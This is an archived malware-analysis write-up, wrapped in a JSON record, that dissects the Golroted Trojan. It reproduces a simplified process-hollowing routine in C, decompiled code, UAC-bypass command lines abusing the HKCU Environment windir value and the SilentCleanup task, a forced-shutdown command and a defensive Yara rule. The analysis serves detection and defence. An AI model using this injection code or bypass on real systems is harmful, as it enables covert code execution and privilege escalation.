{
    "id": "9454fb4c-e5fe-4127-b3d6-cf2fad69bd50",
    "created_at": "2023-01-12T15:02:10.628796Z",
    "updated_at": "2025-03-27T02:05:36.383402Z",
    "deleted_at": null,
    "sha1_hash": "1a60a535f67a80915928c2e97c7637899744bf97",
    "title": "2017-11-12 - Let's Learn- Dissecting Golroted Trojan's Process Hollowing Technique & UAC Bypass in HKCU-Environment",
    "authors": "",
    "file_creation_date": "2022-05-28T04:12:19Z",
    "file_modification_date": "2022-05-28T04:12:19Z",
    "file_size": 806306,
    "plain_text": "# Let's Learn: Dissecting Golroted Trojan's Process Hollowing Technique & UAC Bypass in HKCU\\Environment\n\n**vkremez.com/2017/11/lets-learn-dissecting-golroted-trojans.html**\n\n**Goal: Reverse the Golroted Trojan with the focus on its native API process hollowing technique and User**\nAccount (UAC) bypass method exploiting Environment variables in Scheduled Tasks.\n\n**Source:**\n\nGolroted Trojan sample\n\n(e73b20f639cd9ecc4c8196e885de57043a4baddb70bb4b66e1df13abc7da487e)\n\n**Background**\nBy and large, the Golroted Trojan is notable due to its native call (Nt* API-based) process hollowing technique,\nits user account (UAC) bypass method, and anti-virus checks. It appears to be a relatively popular Trojan,\n[masked as a \".scr\" file, distributed lately as part of the spam impersonating IRS (thanks to @pollo290987).](https://twitter.com/pollo290987)\n\n[#Golroted](https://twitter.com/hashtag/Golroted?src=hash&ref_src=twsrc%5Etfw)\nIRS_REPORT PDF.scr\n624023448a39e6eadb9f7722fae2dcd3\n\nSubject: Urgent attention is needed!\n[— \\_(ʘ_ʘ)_/ (@pollo290987) October 30, 2017](https://twitter.com/pollo290987/status/925072801828167682?ref_src=twsrc%5Etfw)\n\nThe following functions of interest will be analyzed:\n\nProcess hollowing\nUAC bypass\nAnti-virus checks\nPersistence mechanism\nand others\nYara signature\n\n**I. Process hollowing**\n\nThe malware starts a process suspended with CreateProcessA(0x4 CREATE_SUSPENDED process creation\nflag). Ultimately, the malware replaces its content with the content of another. The malware allocates memory\nfor the process replacement via NtAllocateVirtualMemory. Golroted obtains the thread context of the child\nprocess' primary thread via NtGetContextThread, then retrieves the PEB address from the ebx register and\nreads the base address of the executable image from the PEB via NtUnmapViewOfSection. Then, the malware\nwrites the base address of the injected image into the PEB via NtWriteVirtualMemory and sets the thread\ncontext of the child process' primary thread via NtSetContextThread, which is finally resumed the primary thread\nvia NtResumeThread.\n\n\n-----\n\nThe following native API calls the Golroted malware leverages for process hollowing:\n\nNtGetContextThread\nNtReadVirtualMemory\nNtUnmapViewOfSection\nNtSetContextThread\nNtProtectVirtualMemory\nNtWriteVirtualMemory\nNtFlushInstructionCache\nNtAllocateVirtualMemory\nNtResumeThread\n\nThe shortened and simplified process hollowing technique is as follows:\n\nif(CreateProcessA(NULL,DESIRED_PROCESS,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi))\n{\nNtGetContextThread(pi.hThread,&ctx);\nNtReadVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&base,sizeof(PVOID),NULL);\n\nif((DWORD)base==pINH->OptionalHeader.ImageBase)\n{\nNtUnmapViewOfSection(pi.hProcess,base);\n}\n\nmem=VirtualAllocEx(pi.hProcess,(PVOID)pINH->OptionalHeader.ImageBase,pINH>OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);\n\nNtWriteVirtualMemory(pi.hProcess,mem,image,pINH->OptionalHeader.SizeOfHeaders,NULL);\n\nfor(i=0;i<pINH->FileHeader.NumberOfSections;i++)\n{\n\n\n-----\n\npISH=(PIMAGE_SECTION_HEADER)((LPBYTE)image+pIDH >e_lfanew+sizeof(IMAGE_NT_HEADERS)+\n(i*sizeof(IMAGE_SECTION_HEADER)));\nNtWriteVirtualMemory(pi.hProcess,(PVOID)((LPBYTE)mem+pISH->VirtualAddress),(PVOID)\n((LPBYTE)image+pISH->PointerToRawData),pISH->SizeOfRawData,NULL);\n}\n\nctx.Eax=(DWORD)((LPBYTE)mem+pINH->OptionalHeader.AddressOfEntryPoint);\n\nNtWriteVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&pINH>OptionalHeader.ImageBase,sizeof(PVOID),NULL);\nNtSetContextThread(pi.hThread,&ctx);\n\nNtResumeThread(pi.hThread,NULL);\n\nNtClose(pi.hThread);\nNtClose(pi.hProcess);\n}\n\n**A. “Self injection”**\nThe malware retrieves the path to itself via GetModuleFilenameA call and passes itself as an argument to the\nprocess hollowing function.\n\n**B. “Default Browser”**\nGolroted obtains the following browser locations in C:\\\\Program Files (x86)\\\\ or %PROGRAMFILES% and\npasses the output as an argument to the process hollowing function:\n\nMozilla Firefox\\\\firefox.exe\n\\Google\\Chrome\\Application\\chrome.exe\nInternet Explorer\\\\iexplore.exe\n\n\n-----\n\nThe code blob is as follows:\n\nint __usercall ff_chrome_ie_func@<eax>(volatile signed __int32 *a1@<eax>, int a2@<ebx>)\n{\nvolatile signed __int32 *v2;\nint v3;\nint v4;\nint v5;\nunsigned int v7;\n__writefsdword(0, (unsigned int)&v7);\npfiles_path_search_func((int *)&v13, 0);\nfunc11((int *)&v16, v13, (signed __int32)\"Mozilla Firefox\\\\firefox.exe\");\npfiles_path_search_func((int *)&v12, v3);\nfunc11((int *)&v15, v12, (signed __int32)\"\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\");\npfiles_path_search_func((int *)&v11, v4);\nfunc11((int *)&v14, v11, (signed __int32)\"Internet Explorer\\\\iexplore.exe\");\n\n**C. “Notepad”**\nThe malware retrieves the path to notepad.exe in C:\\Windows\\SysWOW64\\ and C:\\Windows\\system32\\\npasses itself as an argument to the process hollowing function.\n\n**II. UAC bypass**\nGolroted checks if the victim host has administrator privileges via IsUserAnAdmin API call. Then, if not admin,\nthe malware executes the so-called \"fileless\" UAC bypass method that exploits Environment variables in\nScheduled Tasks. This method is almost identical to the UAC bypass tweeted out in May 2017 by James\n[Forshaw (@tiraniddo)](https://twitter.com/tiraniddo)\n\n\n-----\n\nset a=hkcu\\Environment /v windir /\n\nreg add %a%d \"cmd /K reg delete %a%f||\"\n\nschtasks/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n[— James Forshaw (@tiraniddo) May 15, 2017](https://twitter.com/tiraniddo/status/864245310440316928?ref_src=twsrc%5Etfw)\n\nThe UAC code function is as follows:\n\nuac_bypass(\nv10,\n3,\n\"     \\\" /f && exit\",\nv37,\n\"/c reg add hkcu\\\\Environment /v windir /d \\\"cmd /c start \",\nv20,\nv21,\nv22);\ncreate_process_fuc(\"C:\\\\Windows\\\\System32\\\\cmd.exe\", v32);\nSleep(2000);\ncreate_process_fuc(\n\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\n\n\n-----\n\n/c schtasks /Run /TN \\\\Microsoft\\\\Windows\\\\DiskCleanup\\\\SilentCleanup /I && exit );\nSleep(1000);\ncreate_process_fuc(\"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"/c reg delete hkcu\\\\Environment /v windir /f &&\nexit\");\nkernel32_wow64_func(0);\nExitProcess_0(0);\n\n**III. Anti-virus checks**\nA. Bitdefender\nGolroted checks for the following Bitdefender location:\n\nC:\\Program Files\\Bitdefender\n\nB. Kaspersky Anti-Virus\n\nThe malware checks for the following Kaspersky AV locations and processes:\n\nKaspersky Lab\\Kaspersky Anti-Virus\n.0.0\\avpui.exe\nC:\\Program Files (x86)\\Kaspersky Lab\\Kaspersky Anti-Virus\nKaspersky Lab\\Kaspersky Internet Security\nC:\\Program Files (x86)\\Kaspersky Lab\\Kaspersky Internet Security\nIf the malware finds Kaspersky AV, it shuts down the machine\n\n\n-----\n\nThe C++ code is as follows:\n\nif ( v4 )\n{\nyourself_func2(0, &v47);\nfunc30(v47, (int *)&v48);\nv5 = v48;\nfunc30(v50, (int *)&v46);\nif ( !func16(v46, v5) && v50 )\nShellExecuteA(0, \"open\", \"cmd.exe\", \"/C shutdown -f -r -t 0\", &dword_417AB4, 0);\nfunc2((int)\"PROGRAMFILES\", (int *)&v45);\nfunc11(&v49, v45, (signed __int32)\"Kaspersky Lab\\\\Kaspersky Anti-Virus \");\nv7 = 13;\ndo\n{\nv8 = v49;\nfunc31(v6, &v44, v7);\nfunc23(v9, 3, \".0.0\\\\avpui.exe\", v44, v8, v31, v32, v33);\nif ( (unsigned __int8)findfile_local(v31, v32, v33, v34) )\n{\nv10 = v49;\nfunc31(v6, &v43, v7);\nfunc23(v11, 3, \".0.0\\\\avpui.exe\", v43, v10, v31, v32, v33);\ngoto LABEL_22;\n\n\n-----\n\n}\n++v7;\n}\nwhile ( v7 != 27 );\n\n**IV. Persistence mechanism**\nGolroted creates persistence as .lnk in \"[USERNAME]\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\\\Startup\\.\"\n\nThe code blob is C++ is as follows:\n\ntemp_func(&v92, v19);\nfunc4(v20, v92);\nv69 = v93;\nfunc4(v21, v103);\nv68 = v91;\nfunc_string(v22, 3, L\".lnk\");\nv23 = (const char *)func5(v68);\nMycomput_dll_func(*a6, v23, a12, a4, (unsigned int)v12);\ntemp_func(&v89, v24);\nv25 = v103;\nGetUserName_func(&v88, v26);\nfunc23(\nv27,\n8,\n\".lnk\\\"\",\nv103,\n\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\",\n\n\n-----\n\nv88,\n\".lnk\\\" \\\"C:\\\\Users\\\\\",\nv25);\nv28 = func19(v90);\nShellExecuteA(0, \"open\", \"cmd.exe\", v28, v68, v69);\n\n**V. Delete Zone.Identifier flag using DeleteFile function**\nThe malware deletes the zone identifier flag via DeleteFileA API to avoid being flagged by Explorer and prevent\npossible alert boxes when launching the executable.\n\n**VI. Miscellaneous**\nGolroted also has various debug information that was presumably used for internal testing including “Notepad”\nprocess hollowing and the following presumably placeholders:\n\nbinderfolderxD\nbindermode\nbinderextension\nrandomfolderxD\n\nThe observed mutex was as follows “UfeRKBdMoE”\n\n**Yara Signature**\n\nrule crime_win32_golrote_trojan {\nmeta:\ndescription = \"Golroted Trojan rule - file golroted.exe\"\nauthor = \"@VK_Intel\"\nreference = \"Detects Golroted Trojan\"\ndate = \"2017-11-11\"\nhash = \"e73b20f639cd9ecc4c8196e885de57043a4baddb70bb4b66e1df13abc7da487e\"\n\nstrings:\n$s0 = \"C:\\\\Windows\\\\System32\\\\Mycomput.dll\" fullword ascii\n$s1 = \".lnk\\\" \\\"C:\\\\Users\\\\\" fullword ascii\n$s2 = \"vbc.exe\" fullword ascii\n$s3 = \"System32\\\\WerFault.exe\" fullword ascii\n$s4 = \"system32\\\\notepad.exe\" fullword ascii\n$s5 = \"Mozilla Firefox\\\\firefox.exe\" fullword ascii\n$s6 = \"FC:\\\\Windows\\\\System32\\\\\" fullword ascii\n$s7 = \"C:\\\\Windows\\\\SysWOW64\\\\ntdll.dll\" fullword ascii\n$s9 = \"Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\regasm.exe\" fullword ascii\n$s10 = \"Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\regasm.exe\" fullword ascii\n$s11 = \"/c reg add hkcu\\\\Environment /v windir /d \\\"cmd /c start \" fullword ascii\n$s12 = \"bindedfiledropandexecute\" fullword ascii\n$s13 = \"/c schtasks /Run /TN \\\\Microsoft\\\\Windows\\\\DiskCleanup\\\\SilentCleanup /I && exit\" fullword\nascii\n$s14 = \"Microsoft.NET\\\\Framework\\\\v2.0.50727\\\\vbc.exe\" fullword ascii\n$s15 = \"Microsoft.NET\\\\Framework\\\\v4.0.30319\\\\vbc.exe\" fullword ascii\n$s16 = \"C:\\\\Program Files (x86)\\\\Kaspersky Lab\\\\Kaspersky Internet Security \" fullword ascii\n$s17 = \"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\" fullword ascii\ncondition:\n\n\n-----\n\nuint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-12 - Let's Learn- Dissecting Golroted Trojan's Process Hollowing Technique & UAC Bypass in HKCU-Environment.pdf"
    ],
    "report_names": [
        "2017-11-12 - Let's Learn- Dissecting Golroted Trojan's Process Hollowing Technique & UAC Bypass in HKCU-Environment.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535730,
    "ts_updated_at": 1743041136,
    "ts_creation_date": 1653711139,
    "ts_modification_date": 1653711139,
    "files": {
        "pdf": "https://archive.orkl.eu/1a60a535f67a80915928c2e97c7637899744bf97.pdf",
        "text": "https://archive.orkl.eu/1a60a535f67a80915928c2e97c7637899744bf97.txt",
        "img": "https://archive.orkl.eu/1a60a535f67a80915928c2e97c7637899744bf97.jpg"
    }
}